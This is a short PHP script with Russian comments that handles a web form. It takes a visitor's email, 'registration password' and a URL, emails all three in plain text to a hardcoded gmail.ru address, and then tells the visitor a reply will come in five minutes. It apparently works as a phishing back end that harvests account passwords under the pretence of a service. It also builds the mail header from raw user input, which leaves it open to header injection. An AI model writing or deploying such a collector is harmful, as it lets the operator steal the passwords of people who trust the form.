<?php 
/* Осуществляем проверку вводимых данных и их защиту от враждебных  
скриптов */ 
$email = htmlspecialchars($_POST["Email"]); 
$Parol = htmlspecialchars($_POST["parol"]); 
$url = htmlspecialchars($_POST["url"]); 
/* Устанавливаем e-mail адресата */ 
$myemail = "hardlinedf@gmail.ru"; 
/* Проверяем заполнены ли обязательные поля ввода, используя check_input  
функцию */ 
$email = check_input($_POST["Email"], "Введите ваш email!"); 
$Parol= check_input($_POST["parol"], "Введите пароль для регистрации"); 
$url = check_input($_POST["url"], "Введите url ссылки"); 
/* Проверяем правильно ли записан e-mail */ 
if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/", $email)) 
{ 
show_error("<br /> Е-mail адрес не существует"); 
} 
/* Создаем новую переменную, присвоив ей значение */ 
$message_to_myemail = "Здравствуйте!  
Вашей контактной формой было отправлено сообщение!  
Email: $email  
Parol: $Parol  
Url: $url 
Конец"; 
/* Отправляем сообщение, используя mail() функцию */ 
$from  = "From: $yourname <$email> \r\n Reply-To: $email \r\n";  
mail($myemail, $tema, $message_to_myemail, $from); 
?> 
<p>Ответ придёт в течение 5 минут. Спасибо за использование сервиса.</p> 
<p>На <a href="index.html">Главную >>></a></p> 
<?php 
/* Если при заполнении формы были допущены ошибки сработает  
следующий код: */ 
function check_input($data, $problem = "") 
{ 
$data = trim($data); 
$data = stripslashes($data); 
$data = htmlspecialchars($data); 
if ($problem && strlen($data) == 0) 
{ 
show_error($problem); 
} 
return $data; 
} 
function show_error($myError) 
{ 
?> 
<html> 
<body> 
<p>Пожалуйста исправьте следующую ошибку:</p> 
<?php echo $myError; ?> 
</body> 
</html> 
<?php 
exit(); 
} 
?>